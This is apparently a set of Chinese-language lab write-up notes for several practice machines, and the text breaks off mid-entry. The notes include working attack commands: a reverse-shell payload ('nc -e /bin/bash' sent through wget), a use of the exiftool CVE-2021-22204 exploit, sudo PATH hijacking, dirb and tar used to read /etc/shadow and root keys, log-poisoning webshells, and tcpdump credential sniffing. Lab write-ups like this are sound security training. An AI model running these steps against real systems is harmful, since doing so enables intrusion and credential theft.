<a name="yN2ei"></a>
### w140
扫到80端口，/server.html里面有个上传点，但是上传之后的文件限制比较大，而且保存的是上传文件的...jpg.txt，点击进去看看<br />![截屏2024-03-11 23.46.52.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710172040336-856fd17e-ae5a-416f-8d5b-04f916a70c72.png#averageHue=%23f4f3f3&clientId=u7bc3f6b5-7933-4&from=paste&height=422&id=uea78b019&originHeight=844&originWidth=1658&originalType=binary&ratio=2&rotation=0&showTitle=false&size=190261&status=done&style=none&taskId=u085709be-d233-4bf2-8e8f-9f351dae0aa&title=&width=829)<br />思路是，那是一个exiftool工具分析出来的工具，版本是12.37，查一下，有可以直接使用的脚本，它会生成一个url，把它作为文件上传时的文件名，发送一下，就自动连接到shell![截屏2024-03-11 23.50.30.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710172234964-fff59904-904e-4201-a01b-8deec9b10804.png#averageHue=%23060606&clientId=u7bc3f6b5-7933-4&from=drop&id=u044f066f&originHeight=1026&originWidth=2134&originalType=binary&ratio=2&rotation=0&showTitle=false&size=254497&status=done&style=none&taskId=ue223b224-4988-422f-9e90-00268a9e047&title=)<br />![截屏2024-03-11 23.51.18.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710172296101-faf7a6b4-ea47-46b9-9ddf-511ceb57298e.png#averageHue=%23f4efed&clientId=u7bc3f6b5-7933-4&from=paste&height=446&id=ufd2d6e35&originHeight=892&originWidth=1400&originalType=binary&ratio=2&rotation=0&showTitle=false&size=140038&status=done&style=none&taskId=ue8e783e6-fb98-43f4-ae6f-5b4827ba8c1&title=&width=700)<br />然后切换用户这里真的需要细心了，我服了，/var/www 查看隐藏文件有个png，下载下来打开是个二维码，扫开就是ghost的密码，就能切换用户。<br />提权就是sudo -l找到/opt/Benz-w140，是个text脚本，里面调用到find命令，思路是修改环境路径<br />**我错了，我以为照往常一样修改全局变量，但是这个sudo -l的setenv是指在执行前可以值得执行的路径，所以要**<br />![截屏2024-03-12 00.02.42.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710172980882-aaede14a-3a36-4eeb-a639-6e237b9418c2.png#averageHue=%230b0909&clientId=u2e23bbe0-9ae9-4&from=paste&height=201&id=ub2e0ce49&originHeight=402&originWidth=1184&originalType=binary&ratio=2&rotation=0&showTitle=false&size=84251&status=done&style=none&taskId=u4837037f-e0ef-4c3b-8397-20e1c429965&title=&width=592)<br />`sudo PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /opt/Benz-w140`<br />![截屏2024-03-12 00.04.21.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710173064362-76a3b6cd-9aef-4b17-bdc8-76103d13c560.png#averageHue=%23090909&clientId=u2e23bbe0-9ae9-4&from=drop&id=u952875b9&originHeight=236&originWidth=2352&originalType=binary&ratio=2&rotation=0&showTitle=false&size=79056&status=done&style=none&taskId=u34612bf3-ffc9-459d-9413-3dbda9e480d&title=)<br />还是要看仔细！！！
<a name="bhSHZ"></a>
#### 抽象
抽象一下，就是看到这个靶场有用到某个功能，相对比较特殊，然后搜索相关的CVE利用
<a name="qiyMi"></a>
### crack
扫到21端口（ftp）和4200端口，说是个shellbox，先看看ftp有什么，注意登录名是anonymous，upload文件夹里面有个crack.py，
```javascript
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359 # 开在12358端口
s.bind(('', port)) # 这是端口绑定
s.listen(50) # 最多允许50个连接请求排队

c, addr = s.accept()
no = "NO"
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024) # 接收用户发过来的文件名，最多1024个字节
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file) # 提取文件名，去除文件路径，只保留文件名部分
                check = "/srv/ftp/upload/"+filename # 构建完整路径，在/uploads下面
                if os.path.isfile(check) and os.path.isfile(file): # check一下有没有
                        f = open(file,"r") 
        # 如果有就读取出来，注意这里这file是我们输入的，前面拿去check的是拼接后的filename
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass
```
所以可以利用ftp上传文件，然后我们读取想读的，比如读取/etc/passwd,除了输入正确的读取路径，还要在uoload下面上传一个名为passwd的文件，然后利用crack.py就可以读取<br />先nc连接，输入想读的就行，然后发现有个用户名叫cris,在4200端口，猜测弱密码账号密码都是cris，登陆成功![截屏2024-03-12 00.21.03.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710174067669-13c89d57-5417-4861-aed4-948b7c85c153.png#averageHue=%23101010&clientId=u2e23bbe0-9ae9-4&from=drop&id=u4de2ff04&originHeight=710&originWidth=2230&originalType=binary&ratio=2&rotation=0&showTitle=false&size=367390&status=done&style=none&taskId=ub68079b2-650f-4718-b99d-fd88cdea246&title=)<br />![截屏2024-03-12 00.22.39.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710174161839-6901501b-db28-409a-a403-b879bc02d086.png#averageHue=%23f4f4f4&clientId=u2e23bbe0-9ae9-4&from=drop&id=ua707ccdb&originHeight=800&originWidth=1596&originalType=binary&ratio=2&rotation=0&showTitle=false&size=156206&status=done&style=none&taskId=ua226aaba-9b91-4985-a10d-851a8ed8d14&title=)
<a name="d0qqV"></a>
#### 提权
sudo -l有个dirb，平时用来扫目录的工具，**利用方式是**<br />`python3 -m http.server 80`自己的kali先用python开个http服务<br />`sudo -u root /usr/bin/dirb http://192.168.64.3:8088/ /etc/shadow`<br />以root身份使用dirb，扫的是我们开的端口，原先设定最后跟的是字典，我们改成其他文件，就能趁机读取那个文件<br />提权思路是读取id_rsa文件，自己在本地存一个。ssh用私钥文件登陆![截屏2024-03-12 00.31.00.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710174663082-2d2a040b-41f1-4710-bc0b-0fca4f15b804.png#averageHue=%230c0c0c&clientId=u2e23bbe0-9ae9-4&from=drop&id=u1de4b3b5&originHeight=1000&originWidth=2770&originalType=binary&ratio=2&rotation=0&showTitle=false&size=584580&status=done&style=none&taskId=u7d87fe92-3c84-4683-b959-30171d8a239&title=)<br />补充，ss -lntp扫描发现22端口只对内开启，所以只能用cris登陆<br />![截屏2024-03-12 00.32.24.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710174747295-023c154d-30d7-4cf9-acd0-ad6b12ddd069.png#averageHue=%23f6f6f6&clientId=u2e23bbe0-9ae9-4&from=drop&id=u69299e5d&originHeight=270&originWidth=2730&originalType=binary&ratio=2&rotation=0&showTitle=false&size=85198&status=done&style=none&taskId=u0f09092d-505d-4482-817c-603630c303f&title=)<br />提取成功。<br />![截屏2024-03-12 00.36.38.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710175001863-cce7e69c-5343-4856-8f16-9c6bea416aeb.png#averageHue=%23ededed&clientId=u2e23bbe0-9ae9-4&from=drop&id=uc7adb944&originHeight=448&originWidth=1512&originalType=binary&ratio=2&rotation=0&showTitle=false&size=125404&status=done&style=none&taskId=ua86f2c00-89ce-4ebc-8688-dd23daf2175&title=)
<a name="trptN"></a>
#### 总结
脚本理解，端口连接用nc，shellbox就是一个终端盒子，顾名思义，dirb提权利用其目录读取文件的功能<br />抽象，借助提权功能的特性，dirb是扫目录的，可以指定字典->字典需要读取文件->所以借机读取我们想要的文件
<a name="LdCMo"></a>
### Arroutada
这个只扫到80端口，访问看看，只有一张图片，扫一下目录,扫到一个/scout![截屏2024-03-12 22.50.45.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710255048638-5428a354-12e6-4a6e-bd08-1b206e6b2d26.png#averageHue=%23f9f9f9&clientId=u01ad5e30-5a5b-4&from=drop&id=uf8deda1b&originHeight=668&originWidth=1580&originalType=binary&ratio=2&rotation=0&showTitle=false&size=74851&status=done&style=none&taskId=u60553929-b3fa-4de5-bacd-a08e066a379&title=)<br />他提示有个目录，但是路径中间部分需要fuzz，我也不知道wp作者用的什么字典（破案了，用medium能扫出来，要很久），最后fuzz出了个j2，访问后有个pass.txt，和一个加密的ods文件，还有一个没什么用的z206（虽然文件大小不是0）<br />![截屏2024-03-12 22.59.09.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710255555105-0af0f049-4801-4e75-9022-7d6752612b10.png#averageHue=%23f3f3f3&clientId=u01ad5e30-5a5b-4&from=drop&id=uc843f07b&originHeight=822&originWidth=1174&originalType=binary&ratio=2&rotation=0&showTitle=false&size=135211&status=done&style=none&taskId=u84e58d86-c3b0-499e-a72a-37feea85d01&title=)<br />用一下命令给shellfile.ods爆破出密码（学到了）<br />`libreoffice2john shellfile.ods>hash`<br />`johnhash--wordlist=/home/kali/rockyou.txt`<br />爆破出密码后还需要在线网站解密出来,得到一个新的ods文件，打开看一下，给了一个新的path<br />![截屏2024-03-12 23.07.54.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710256078239-5c3d68c1-98a3-4352-b764-f5b7a798329c.png#averageHue=%23fbfaf9&clientId=u01ad5e30-5a5b-4&from=drop&id=uaa3ff674&originHeight=386&originWidth=1440&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36588&status=done&style=none&taskId=ud5051f4a-ad33-4b40-9f88-ac77f8ab8a2&title=)<br />访问是一片空白，但是看文件名，顺着思路**就是有命令执行，但是不知道参数是哪个，需要fuzz**<br />用burp扫了，最后扫出来参数是a，还说差一个b，也不知道要跟什么，又需要fuzz，最后fuzz出是pass<br />![截屏2024-03-12 23.24.32.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710257077417-ee35eb0a-b735-4f75-ad30-f06ad43bb8be.png#averageHue=%23efc19b&clientId=u8b58086c-d53b-4&from=drop&id=uee760f77&originHeight=1090&originWidth=1170&originalType=binary&ratio=2&rotation=0&showTitle=false&size=102199&status=done&style=none&taskId=u6b3ad704-ec78-4285-a3b9-19cb8d46e0c&title=)<br />![截屏2024-03-12 23.12.55.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710256378627-f9053b70-b7c5-4968-bfb3-2250ecb911b1.png#averageHue=%23f8f8f8&clientId=u01ad5e30-5a5b-4&from=drop&id=u1368e6e8&originHeight=278&originWidth=1132&originalType=binary&ratio=2&rotation=0&showTitle=false&size=34975&status=done&style=none&taskId=uac1b4b2b-fad2-4141-83fb-cd0a3f6f943&title=)<br />这两个fuzz太想不到了！<br />![截屏2024-03-12 23.15.48.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710256553848-5ebab3b7-a774-4e3e-a48a-b76c62460410.png#averageHue=%23f3f4f6&clientId=u01ad5e30-5a5b-4&from=drop&id=ud4644146&originHeight=268&originWidth=1314&originalType=binary&ratio=2&rotation=0&showTitle=false&size=38351&status=done&style=none&taskId=u3f28fd16-2a7c-4f68-ae65-20e26329e8f&title=)<br />这样就算拿到一个shell，反弹一![截屏2024-03-12 23.17.18.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710256642779-ce7a054e-fd7c-4d23-b9c4-aefc872db8d7.png#averageHue=%23070707&clientId=u01ad5e30-5a5b-4&from=drop&id=ub536be95&originHeight=406&originWidth=1430&originalType=binary&ratio=2&rotation=0&showTitle=false&size=95716&status=done&style=none&taskId=ud90f7efb-13e6-4575-a38f-fe61b4de2ef&title=)<br />然后我用pspy看到过段时间ditro会开启一个web服务，后来在crontab也能看到，ss -lntp发现对内开了8000端口，访问一下给了一个index.html,再提示有个priv.ph
```javascript
/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```
以json格式POST发送请求可以命令执行<br />`wget --post-data='{"command":"nc -e /bin/bash 192.168.64.3 8888"}' [http://127.0.0.1:8000/priv.php](http://127.0.0.1:8000/priv.php)`<br />利用wget发送请求就能反弹到dirto的shell
<a name="upBwq"></a>
#### 提权
![截屏2024-03-12 23.50.03.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710258610513-39526526-77bc-47c3-ab0e-d80aa4d11111.png#averageHue=%23080808&clientId=uaa4ee3cb-ffe2-4&from=drop&id=Z9zOJ&originHeight=532&originWidth=1438&originalType=binary&ratio=2&rotation=0&showTitle=false&size=116620&status=done&style=none&taskId=u7d49dbad-0e23-4368-b797-5f2e3b63939&title=)<br />提权反而很简单，xargs，直接复制粘贴，提权成功
<a name="n7rkC"></a>
#### 总结
先是fuzz出j2，再破解ods文件密码，找到新的路径可能存在命令执行要fuzz参数，先后fuzz出了a，b，拿到www-data，发现对内开了8000端口，然后顺藤摸瓜发现有个新的命令执行php，这次请求的格式比较特殊，还是能拿到用户的shell，后面的提权反而很简单<br />这个靶场解谜属性比较重
<a name="UAWRL"></a>
### hannah
扫端口扫出了ssh用户名，爆破登陆<br />后续的提权比较有意思，查看crontab发现PATH比平时多了个/media<br />![截屏2024-03-12 23.58.50.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710259164617-f818607c-d68d-4b07-824f-b4f962ef2c10.png#averageHue=%23070707&clientId=uaa4ee3cb-ffe2-4&from=paste&height=292&id=u8285e5e6&originHeight=584&originWidth=1874&originalType=binary&ratio=2&rotation=0&showTitle=false&size=167606&status=done&style=none&taskId=u3edc567d-c738-4714-b45a-324ce39c8f2&title=&width=937)<br />发现有这个定时任务，会使用到touch，所以思路还是改变环境路径<br />![截屏2024-03-13 00.01.28.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710259293572-c66ddadd-8d1b-4a88-8407-7408879d569c.png#averageHue=%23000000&clientId=uaa4ee3cb-ffe2-4&from=drop&id=u2ea0c44e&originHeight=464&originWidth=1612&originalType=binary&ratio=2&rotation=0&showTitle=false&size=170343&status=done&style=none&taskId=u606b0714-0600-4b70-b54b-11551992e28&title=)<br />然后根目录下的media权限比较多，所以这次操作在/media下执行<br />![截屏2024-03-13 00.01.54.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710259318941-59846958-5bb7-4be4-ae9a-757f55a3f2a1.png#averageHue=%230c0c0c&clientId=uaa4ee3cb-ffe2-4&from=drop&id=ue0fe22b8&originHeight=386&originWidth=1334&originalType=binary&ratio=2&rotation=0&showTitle=false&size=166132&status=done&style=none&taskId=u0d4a0b6a-2737-4907-bfa1-cdac29dc744&title=)<br />crontab的路径（和系统的还不一样，执行定时任务是跟着这里的顺序），**本来touch是在/usr/bin下面，但是这里放在/media后面，所以利用这个劫持，执行时优先找到media下面的**<br />![截屏2024-03-13 00.13.07.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710259993845-2d5f1d40-5d4f-4577-a01e-7368f3af9495.png#averageHue=%23050505&clientId=uaa4ee3cb-ffe2-4&from=drop&id=u9acb8c9e&originHeight=176&originWidth=1662&originalType=binary&ratio=2&rotation=0&showTitle=false&size=32679&status=done&style=none&taskId=ufdb77f63-6ac8-45a3-b156-e3670553a16&title=)
<a name="HZhU2"></a>
### thewall
开了80端口和22端口，80端口之后一句hello world，没什么更多的内容
<a name="UCOXy"></a>
#### waf
第一个点来了，开了WAF，扫了目录发现一直都是403，最开始以为换个字典搞个过滤就行，原来是WAF的限制 https://github.com/ekultek/whatwaf.有这个工具检测是否有waf，检测出来确实有，403是服务器表示有这个请求但是不给你处理<br />“The web server has a WAF that responses a 403 error if maximum of "not found requests" per minute is overpassed.”，意思就是规定时间内不能给web发送太多请求，所以现在使用gobuster，有一个deplay<br />`gobuster -q dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -u http://192.168.64.67 --delay 1s -t 1`<br />--delay 1s: 这个选项指定了请求之间的延迟时间，以避免对目标服务器造成过多负载。在这里，设置为每个请求之间延迟 1 秒钟<br />-t 1: 这个选项指定了并发线程的数量。在这里，设置为 1，表示只使用一个线程执行扫描<br />这样就能扫到有index.php和includes.php
<a name="NBsay"></a>
#### 找参数
来到indludes.php，按照正常思路就是利用fuzz找到那个参数，最后找出来的是display_page<br />能够成功读到/etc/passwd，这里也能读到user.txt<br />接下来利用日志文件拿到shell，注意这里发送一句话木马的方式是<br />`nc 192.168.64.67 80`<br />然后回车写一句php，再去访问access.log,连接一下，蚁剑就能连接成功<br />**学习点，利用日志的时候，发一句话木马也可以通过nc的方式**
<a name="fA4H2"></a>
#### exiftool读写文件--利用私钥登陆
能到第一个shell后，sudo -l发现exiftool可以用，查了一下可以用来读写文件<br />**利用思路：把自己kali的id_rsa写入到john /.ssh/authorized_keys,然后在自己的kalissh登陆**<br />先复制自己的kali里面的id_rsa.pub到/tmp目录下，然后用exiftool读取后写入到.ssh/authorized_keys，再在自己kali的.ssh -i id_rsa.pub登陆john<br />`**sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub**`
<a name="s7w64"></a>
#### tar cap_dac_read_search利用
拿到john后，getcap发现tar有写cap_dac_read_search=ep读取和搜索功能<br />**利用思路：利用有特权的tar将root的id_rsa压缩在自己的目录下，然后解压读取，利用读取到的文件登陆root**<br />`**/usr/sbin/tar -cf id_rsa.tar /id_rsa**`**,**这个靶机的id_rsa直接放在了根目录下<br />解压后<br />`ssh root@127.0.0.1 -i id_rsa`就能登陆root，提权成功
<a name="pOzii"></a>
#### 总结
waf的发现，gobuster的delay扫描，利用有权限的工具读写私钥再ssh登陆，文件包含参数的fuzz，文件的fuzz，日志文件的利用
<a name="SDoDQ"></a>
### jabita
web端扫到个/buliding，一访问就发现index.php有文件包含，连参数都给好了，读不到日志，没办法远程包含，读不到user.txt，能用伪协议读源码，但没什么用<br />然后就用burp配合lif字典扫描，扫到/etc/shadow
<a name="hkRQc"></a>
#### /etc/shadow发现并爆破密码
![截屏2024-03-14 15.46.59.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710402421573-7671971e-b4c3-40ab-9a93-dd794d5ca639.png#averageHue=%23b4b4b4&clientId=u8a61268f-e38a-4&from=drop&id=u37feb9d3&originHeight=476&originWidth=1782&originalType=binary&ratio=2&rotation=0&showTitle=false&size=159932&status=done&style=none&taskId=udaff149c-c670-4b0a-9486-7ba5efb8b54&title=)<br />可以jaba的东西用john爆破，然后就能ssh登陆了<br />![截屏2024-03-14 15.49.28.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710402571522-a6d4b30d-d46c-4dd1-aa38-cd5ec78cd9dd.png#averageHue=%23cdcdcd&clientId=u8a61268f-e38a-4&from=drop&id=u1defc00a&originHeight=722&originWidth=1840&originalType=binary&ratio=2&rotation=0&showTitle=false&size=206575&status=done&style=none&taskId=u912bdbd6-1795-42fb-bf75-2aba8f4178f&title=)<br />登陆john账户后发现jaba账号可以awk提权，查过之后利用一下就到了jaba的账户
<a name="BgibU"></a>
#### py文件引入模块利用
![截屏2024-03-14 15.52.08.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710402734521-081dc696-929e-444e-914f-b67056a3fb50.png#averageHue=%23080808&clientId=u8261661e-2f85-4&from=drop&id=xL95A&originHeight=450&originWidth=1516&originalType=binary&ratio=2&rotation=0&showTitle=false&size=118576&status=done&style=none&taskId=u2ac862c7-51f6-4498-ad19-fcf67517210&title=)<br />发现有个clean.py可以利用,里面import了wild模块![截屏2024-03-14 15.53.18.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710402800993-214381d5-b4f1-46f3-a270-a3f6d11396a0.png#averageHue=%23070707&clientId=u8261661e-2f85-4&from=drop&id=udae43964&originHeight=298&originWidth=974&originalType=binary&ratio=2&rotation=0&showTitle=false&size=60153&status=done&style=none&taskId=udb9dfc86-1634-4b72-9611-26958127080&title=)<br />找一下wild源文件在哪，有写入的权限，那就编辑一下，引入os，再给个/bin/sh<br />![截屏2024-03-14 15.54.36.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710402880016-ceaa08d7-5331-4f61-b8cd-63ac6bb1ba87.png#averageHue=%23080808&clientId=u8261661e-2f85-4&from=drop&id=ua791ea10&originHeight=562&originWidth=1410&originalType=binary&ratio=2&rotation=0&showTitle=false&size=163156&status=done&style=none&taskId=u8d01de3d-5907-47ec-85e4-ed3738ffbc5&title=)<br />最后用sudo执行clean.py，提权成功<br />![截屏2024-03-14 15.55.41.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710402944490-fdc3164a-b160-4eb9-89b0-f9abcdceec1c.png#averageHue=%23080808&clientId=u8261661e-2f85-4&from=drop&id=ue4dfacba&originHeight=242&originWidth=1150&originalType=binary&ratio=2&rotation=0&showTitle=false&size=54232&status=done&style=none&taskId=ua8f5196a-8796-47fa-b524-bb087d5d82c&title=)
<a name="rj4mL"></a>
#### 总结
扫目录，python引入模块的使用，burp扫lfi字典，john爆破shadow给的密文
<a name="vIUN4"></a>
### dejavu
web端扫到info.php，查看源码给了个目录<br />![截屏2024-03-14 16.00.32.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710403235644-d679f306-cb5d-49ca-8f4e-0f98bc5b1042.png#averageHue=%23f7f7f7&clientId=u8261661e-2f85-4&from=drop&id=u1630f3ce&originHeight=286&originWidth=1142&originalType=binary&ratio=2&rotation=0&showTitle=false&size=46252&status=done&style=none&taskId=u76ec7f8c-8ffd-490b-ae2c-ef4f01dd0ab&title=)<br />有个upload.php，还有个files（看不到东西），然后就试一下文件上传<br />![截屏2024-03-14 16.01.27.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710403289746-1ff653ee-7dbc-4ad2-b6bb-0cb224975b01.png#averageHue=%23f5f5f5&clientId=u8261661e-2f85-4&from=drop&id=uedeecbe7&originHeight=512&originWidth=1118&originalType=binary&ratio=2&rotation=0&showTitle=false&size=71080&status=done&style=none&taskId=uad2b898f-dda4-4501-8cc7-798a4300814&title=)<br />测试了一下（还是有段时间的）发现不要php，phtml即可绕过，文件内容继续是php就行<br />然后就顺利连上蚁剑，但是打开虚拟终端无论输入什么命令都返回ret=127<br />查过之后知道这个有个命令限制，需要绕过，之前蚁剑就装了插件绕过disable function，选择模式是user_filter，开始执行然后就正常了，调用上传的后门php，翻到的一个shell<br />sudo -l 发现有个tcpdump，最开始查找提权命令后试图提权，一直失败
<a name="F4shU"></a>
#### tcpdump抓包
![截屏2024-03-14 16.06.35.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710403602620-17b298f5-466b-4e6a-b3df-1e1dcce26b62.png#averageHue=%23070707&clientId=u3674a493-c096-4&from=drop&id=u9aec996f&originHeight=368&originWidth=1920&originalType=binary&ratio=2&rotation=0&showTitle=false&size=107763&status=done&style=none&taskId=ua028fe30-9d9b-42d9-a8f0-bf5ef54eeb0&title=)<br />看wp后才知道pspy64可以检测到,robert账户会登陆ftp账户，也可以查到靶机对内开了21端口<br />![截屏2024-03-14 16.09.47.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710403791437-29340f85-6c06-42c0-adae-dc2a0f95c25c.png#averageHue=%23010101&clientId=u3674a493-c096-4&from=drop&id=u7a0a5321&originHeight=504&originWidth=1460&originalType=binary&ratio=2&rotation=0&showTitle=false&size=308706&status=done&style=none&taskId=u3b28a10f-fc66-4ccb-a405-c8522ee5840&title=)![截屏2024-03-14 16.08.58.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710403743425-2d45b827-8adc-4a3b-8b58-f4b4ba814ee5.png#averageHue=%23050505&clientId=u3674a493-c096-4&from=drop&id=u5d9cd28d&originHeight=322&originWidth=1752&originalType=binary&ratio=2&rotation=0&showTitle=false&size=120958&status=done&style=none&taskId=u5477dae6-929f-4c8c-b054-b52013c9771&title=)<br />所以利用tcpdump抓包查看看<br />`sudo -u robert /usr/sbin/tcpdump tcp port 21 -c 10 -w /tmp/tcp.txt -i lo`

- **-c 10**: 这个选项指定了要捕获的数据包数量上限，这里是 10 个。
- **-w /tmp/tcp.txt**: 这个选项指定了捕获的数据包要写入的文件路径，这里是 **/tmp/tcp.txt**，意味着捕获的数据包将会被写入到 **/tmp/tcp.txt** 文件中。
- **-i lo**: 这个选项指定了要监听的网络接口，这里是 **lo**，意味着只监听本地回环接口（loopback interface），用于捕获本地主机与自身之间的通信。

然后查看/tmp/tcp.txt，就找到了robert的登陆密码<br />![截屏2024-03-14 16.13.16.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710404001541-348c528d-2897-4ba7-9322-2a3ef9f699b1.png#averageHue=%230a0a0a&clientId=u3674a493-c096-4&from=drop&id=u66ee54b6&originHeight=1000&originWidth=1664&originalType=binary&ratio=2&rotation=0&showTitle=false&size=297080&status=done&style=none&taskId=u005edbeb-be52-4bc2-93f7-565cbff4e14&title=)
<a name="NcoJn"></a>
#### exiftool漏洞利用
sudo -l,看到exiftool可以利用，查看一下版本，是12.23<br />![截屏2024-03-14 16.14.17.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710404065532-0b002f54-4ca3-4723-9555-6d9cdba1547a.png#averageHue=%230a0a0a&clientId=u8201bbc4-c50c-4&from=drop&id=C10Fh&originHeight=386&originWidth=1248&originalType=binary&ratio=2&rotation=0&showTitle=false&size=99240&status=done&style=none&taskId=u170d7545-d0cd-495c-b72d-97791899ecb&title=)<br />可以找到漏洞利用，不知道为什么自带的不好用，直接去github搜CVE-2021-22204，wp发现了一个好用的<br />复制脚本在靶机保存一份，bash利用后面跟一句要写的命令和要加工的图片（github有教）<br />![截屏2024-03-14 16.19.07.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710404374185-e0505fa1-04cd-460f-b659-39c4b13d3998.png#averageHue=%23060505&clientId=u8201bbc4-c50c-4&from=paste&height=626&id=ubf2f67e5&originHeight=1252&originWidth=1654&originalType=binary&ratio=2&rotation=0&showTitle=false&size=264907&status=done&style=none&taskId=u681d130c-6d47-4339-afc3-cdc6c90aa48&title=&width=827)<br />然后利用sudo执行exiftool改变后的图片，提权成功。<br />exiftool也可以任意读取文件，但是这个靶机的root.txt命名不同往常，作者这么命名就是为了堵死这条路
<a name="Qo6me"></a>
#### 总结
**tcpdump抓包使用，exiftool漏洞利用**，文件上传名字绕过，扫目录<br />提权抽象一下，对可以利用工具的使用，根据工具本身的特性获取我们想要的内容
<a name="Kuww3"></a>
### art
 web端有几张图片，简单分析分析不出什么东西，目录也没扫到什么<br />源码有一句说要解决tag的参数问题，看了wp才知道tag是个参数（这种还fuzz不太出来，以为就是知道参数，也不知道后续可以怎么利用）<br />![截屏2024-03-14 17.14.27.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710407673781-a5ab8954-944f-4b70-a8e4-8323773eb29b.png#averageHue=%23050505&clientId=u8201bbc4-c50c-4&from=drop&height=445&id=iJf0j&originHeight=1388&originWidth=1524&originalType=binary&ratio=2&rotation=0&showTitle=false&size=286880&status=done&style=none&taskId=u51febed4-8a15-407a-b879-01605eec330&title=&width=489)<br />(后来看到源码）<br />呃，可以sql注入，sqlmap跑一下<br />![截屏2024-03-14 16.50.09.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710406212797-91facff6-2375-4073-a388-ff4c08a9910d.png#averageHue=%23f7f7f7&clientId=u8201bbc4-c50c-4&from=drop&id=u22693d0d&originHeight=306&originWidth=1408&originalType=binary&ratio=2&rotation=0&showTitle=false&size=52486&status=done&style=none&taskId=u23ddcf43-39b8-4db5-a3db-160b9442137&title=)<br />可以看到有这几张图片<br />![截屏2024-03-14 16.51.06.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710406270631-faa4c0f3-7ecd-4561-b058-66f0e9409216.png#averageHue=%23050505&clientId=u8201bbc4-c50c-4&from=drop&id=u75e1a7f9&originHeight=564&originWidth=962&originalType=binary&ratio=2&rotation=0&showTitle=false&size=124591&status=done&style=none&taskId=u250f2432-595b-42d4-b8db-fa016b65fb3&title=)<br />那张dsa的标签比较特殊，下载到本地用工具分析，有一个yes.txt<br />![截屏2024-03-14 16.51.49.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710406312623-327d9283-55b7-4380-bfd4-9b40856b58c0.png#averageHue=%23040404&clientId=u8201bbc4-c50c-4&from=drop&id=u8b7231f2&originHeight=364&originWidth=1270&originalType=binary&ratio=2&rotation=0&showTitle=false&size=99759&status=done&style=none&taskId=u26a12358-8b02-4cbe-94d8-156c9fc0de9&title=)<br />给了一个lion的账号密码<br />![截屏2024-03-14 16.52.43.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710406366424-6bd98d8e-9380-49e9-aafb-dbfa12861b69.png#averageHue=%23050505&clientId=u8201bbc4-c50c-4&from=drop&id=uea7b874b&originHeight=372&originWidth=532&originalType=binary&ratio=2&rotation=0&showTitle=false&size=60564&status=done&style=none&taskId=u8daa20a1-34ce-4cbe-a88f-7532892f591&title=)<br />登陆即可，以上部分有点解谜
<a name="IMWcG"></a>
#### 提权
![截屏2024-03-14 16.54.16.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710406459498-717250d9-b093-4d78-a9d3-ed6d5e0774ed.png#averageHue=%23060606&clientId=u8201bbc4-c50c-4&from=drop&id=ua3da2eca&originHeight=350&originWidth=1242&originalType=binary&ratio=2&rotation=0&showTitle=false&size=125023&status=done&style=none&taskId=ua1f8efce-edbf-4baf-b472-f65cb273d5d&title=)<br />有个wtfutil可以用，最开始都不知道能干嘛，也查不到提权方式，漏洞库也找不到可利用的脚本<br />看一下它使用情况，直接执行后是个面板，给出了配置下文件<br />![截屏2024-03-14 17.06.01.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710407182935-bedf9829-a7fd-4b11-8849-db8a16655485.png#averageHue=%23060606&clientId=u8201bbc4-c50c-4&from=paste&height=760&id=u0a91deb3&originHeight=1520&originWidth=2054&originalType=binary&ratio=2&rotation=0&showTitle=false&size=498494&status=done&style=none&taskId=u478ead41-8ae1-412a-befd-1e2f36c2824&title=&width=1027)<br 